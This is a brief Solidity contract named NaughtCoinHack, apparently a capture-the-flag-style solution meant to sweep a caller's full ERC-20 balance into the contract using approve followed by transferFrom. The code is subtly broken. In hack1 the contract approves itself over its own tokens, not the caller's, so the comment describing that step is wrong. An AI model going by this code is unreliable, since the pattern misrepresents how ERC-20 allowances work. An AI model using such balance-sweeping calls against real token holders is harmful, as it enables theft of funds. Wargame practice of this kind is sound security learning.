// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract NaughtCoinHack {
      function hack1(address _target) external {
        IERC20 token = IERC20(_target);
        uint256 amount = token.balanceOf(msg.sender);
        
        // Approve this contract to transfer `amount` tokens from the sender
        token.approve(address(this), amount);
      
    }
    function hack(address _target) external {
        IERC20 token = IERC20(_target);
        uint256 amount = token.balanceOf(msg.sender);
        
        
        // Transfer `amount` tokens from the sender to this contract
        token.transferFrom(msg.sender, address(this), amount);
    }
}
